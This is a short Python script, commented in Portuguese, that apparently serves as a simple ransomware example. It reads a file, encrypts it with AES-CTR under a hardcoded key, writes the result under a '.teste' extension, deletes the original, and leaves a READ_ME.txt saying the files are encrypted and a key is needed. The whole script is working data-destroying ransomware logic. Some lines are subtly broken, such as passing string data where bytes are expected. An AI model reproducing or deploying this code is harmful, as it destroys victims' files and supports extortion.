import os, sys, pyaes

# Localizando e lendo os dados do arquivo ou diretório
file_name = 'nomedoarquivo.txt' #Arquivo ou diretório que será ser encriptado
file = open(file_name, 'rb') #Abrindo no modo leitura
file_data = file.read() #Ler os dados do arquivo
file.close()

# Criptografando os dados do arquivo ou diretório
chave = '0h2lK8I6Y39Y1T!%' #Chave aleatória da Criptografia com 16 caracteres, com 16 bites
aes = pyaes.AESModeOfOperationCTR(chave) #função que criptografa
encripta_dados = aes.encrypt(file_data) #Criptografando o arquivo

novo_nome_arquivo = file_name + '.teste' #Criar novo arquivo com a nova extensão
novo_arquivo = open(novo_nome_arquivo, 'wb') #Abrindo no modo escrita
novo_arquivo_data = novo_arquivo.write(encripta_dados) #substituindo os dados encriptados no novo arquivo
novo_arquivo.close()

os.remove(file_name) #Removendo o arquivo original
text_name = 'READ_ME.txt' #criando arquivo de texto
text = open(text_name, 'wb') #Abrindo e escrevendo no arquivo de texto
text_data = text.write('Os arquivos estão criptografados, insira a chave para descriptografar')
text.close() #Fechando o arquivo de texto
